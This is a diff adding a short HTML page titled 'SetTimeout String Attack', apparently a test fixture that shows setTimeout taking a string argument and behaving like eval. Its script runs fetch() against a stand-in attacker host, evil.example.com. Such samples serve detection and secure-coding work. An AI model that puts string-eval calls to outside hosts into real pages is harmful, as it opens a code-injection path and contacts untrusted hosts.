@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>SetTimeout String Attack</title>
+</head>
+<body>
+  <div id="root">Display</div>
+  <script>
+    // Attack: setTimeout with string acts like eval
+    setTimeout("fetch('https://evil.example.com')", 1000);
+  </script>
+</body>
+</html>
